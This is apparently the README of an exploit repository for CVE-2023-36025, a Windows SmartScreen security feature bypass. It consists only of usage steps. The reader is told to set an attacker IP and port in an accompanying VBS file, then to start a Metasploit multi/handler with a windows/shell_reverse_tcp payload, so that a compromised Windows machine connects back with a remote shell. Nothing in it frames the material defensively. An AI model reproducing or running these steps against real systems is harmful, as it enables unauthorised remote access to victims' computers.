# [EXPLOIT] CVE-2023-36025 - Description
Windows SmartScreen Security Feature Bypass Vulnerability

# Usage
- NOTE handler waiting for tcp request for target
- P.S configure CVE-2023-36025.vbs file to change the ip and port to machine ip and port that is being used for the TCP handler 
- configure reverse TCP handler
  msfconsole 
  use exploit/multi/handler 
  set payload windows/shell_reverse_tcp
  set LHOST <MACHINE IP>
  set LPORT <MACHINE PORT>
  run

